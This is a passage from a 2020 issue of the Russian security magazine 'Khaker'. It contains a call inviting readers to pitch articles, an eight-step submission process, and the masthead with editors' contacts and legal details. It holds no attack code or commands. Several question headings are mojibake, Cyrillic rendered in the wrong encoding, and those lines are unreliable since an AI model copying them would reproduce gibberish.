 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №05 (254)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен        Иван «aLLy» Андреев
               pismenny@glc.ru             rusanen@glc.ru         iam@russiansecurity.expert
            Евгений Зобнин          Татьяна Чупрова        Андрей Васильков
                 zobnin@glc.ru              chuprova@glc.ru        the.angstroem@gmail.com
                   Вален тин Холмогоров     Виктор Олейников
                           valentin@holmogorov.ru     fabulous.faberge@yandex.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2020